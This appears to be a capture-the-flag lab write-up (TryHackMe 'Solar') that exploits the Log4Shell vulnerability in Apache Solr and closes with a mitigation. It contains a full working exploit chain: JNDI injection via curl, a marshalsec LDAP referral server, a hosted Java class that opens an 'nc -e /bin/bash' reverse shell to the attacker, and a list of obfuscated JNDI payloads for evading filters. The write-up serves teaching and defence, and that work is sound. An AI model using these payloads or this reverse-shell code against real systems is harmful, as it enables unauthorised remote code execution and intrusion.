# CVE-2021-44228
## Date: 12/09/2021
### Severity: 10.0

The Java logging package log4j offers a trivial remote code execution. 

Log4j Version 2.16.0 is available and patches this vulnerability as of 12/14/2021 (JNDI is fully disabled, support for Message lookups is removed and the DoS has been removed)

There was also a Black hat talk on log4j in 2016
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
### https://tryhackme.com/room/solar
Links for the Tryhackme room author:
https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java

https://log4shell.huntress.com/

https://www.youtube.com/watch?v=7qoPDq41xhQ

```
┌──(kali㉿kali)-[~/thm/solar-log4j]
└─$ nmap -p111,8983 10.10.148.137 -sV     
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-15 03:09 EST
Nmap scan report for 10.10.148.137
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
8983/tcp open  http    Apache Solr

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```
![](https://i.imgur.com/KgAIvjU.png)

tryhackme gives us some logs to take a look at:
```
└─$ cat solr.log| grep 1337       
2021-12-13 04:01:46.718 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0
2021-12-13 04:01:48.672 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0
2021-12-13 04:01:49.304 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0
2021-12-13 04:01:50.401 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={id=1337} status=0 QTime=0
```
This gives us our endpoint at /solr/admin/cores and we see that params={} is included in the log files.

The log4j package adds "logic" to the logs by parsing each line. This can be abused to evaluate code. Some of the syntax to execute code instantly:
```
    ${sys:os.name}
    ${sys:user.name}
    ${log4j:configParentLocation}
    ${ENV:PATH}
    ${ENV:HOSTNAME}
    ${java:version}
	${jndi:ldap://maliciousHost}
```
The last one uses JNDI or Java Naming Directory Interface. You can also see te use of ldap:// but is not the only naming system to be effected. 

### Where do we enter our payload? 
*anywhere that has data logged by the application*

Possible locations:
- input boxes
- User and Password forms
- data entry points in an application
- HTTP headers like User-Agent, X-Forwarded-For, or other customizable headers
- any place for user-supplied data

So our POC payload looks like this
```
curl \
http://10.10.148.137:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.139:443\}
```
![](https://i.imgur.com/TCsDIrN.png)

No delay, it connects immediately. 

This connection is looking for an LDAP server though and the response is just a response. 
### https://github.com/mbechler/marshalsec
This Github has a ldap server we can spin up to redirect our payload.

So the steps are as follows
- set up ldap reference server
- create a java reverse shell payload 
- host the reverse shell payload and point our ldap server here
- send our jndi payload pointed at the ldap reference server
```bash
┌──(kali㉿kali)-[~/thm/solar-log4j]
└─$ curl 'http://10.10.148.137:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.139:1389/Exploit\}'
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}

──────────────────────────────────────────────────────────────────────────────────
┌──(kali㉿kali)-[~/thm/solar-log4j/marshalsec]
└─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.2.139:8888/#Exploit"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
Send LDAP reference result for Exploit redirecting to http://10.9.2.139:8888/Exploit.class

─────────────────────────────────────────────────────────────────────────────────
┌──(kali㉿kali)-[~/thm/solar-log4j]
└─$ sudo python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.148.137 - - [15/Dec/2021 04:19:56] "GET /Exploit.class HTTP/1.1" 200 -

──────────────────────────────────────────────────────────────────────────────────
└─$ cat Exploit.java 
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.9.2.139 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
                                                               
┌──(kali㉿kali)-[~/thm/solar-log4j]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.9.2.139] from (UNKNOWN) [10.10.148.137] 42924
id && ip a | grep inet
uid=1001(solr) gid=1001(solr) groups=1001(solr)
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
    inet 10.10.148.137/16 brd 10.10.255.255 scope global dynamic eth0
    inet6 fe80::a5:b8ff:fee8:747f/64 scope link 
```
![](https://i.imgur.com/QrGACWz.png)

After setting up a ssh key we can ssh into the box, we also have full sudo permsions and can chang the users password to ssh with a password. Lets see our exploit in the logs

```
solr@solar:/var/solr/logs$ cat solr.log | grep -i exploit

2021-12-15 09:18:51.037 INFO  (qtp1083962448-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.9.2.139:1389/Exploit}} status=0 QTime=0

2021-12-15 09:19:56.612 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.9.2.139:1389/Exploit}} status=0 QTime=0

2021-12-15 09:29:53.036 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.9.2.139:1389/Exploit}} status=0 QTime=0
```

### Obfuscating the payload
```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

### Mitigation

adding this line to the /etc/default/solr.in.sh
```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

```bash
solr@solar:/var/solr/logs$ tail /etc/default/solr.in.sh 
# See https://docs.oracle.com/en/java/javase/11/troubleshoot/command-line-options1.html
# You can test this behaviour by setting SOLR_HEAP=25m
#SOLR_HEAP_DUMP=true
#SOLR_HEAP_DUMP_DIR=/var/log/dumps
SOLR_PID_DIR="/var/solr"
SOLR_HOME="/var/solr/data"
LOG4J_PROPS="/var/solr/log4j2.xml"
SOLR_LOGS_DIR="/var/solr/logs"
SOLR_PORT="8983"
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

Restart solr

```
sudo /etc/init.d/solr restart
```

Running our curl command with our ldap reference server and exploit code being served we dont get any action on our ldap server. Removing that one line of code allows the reverse shell to pop again. 












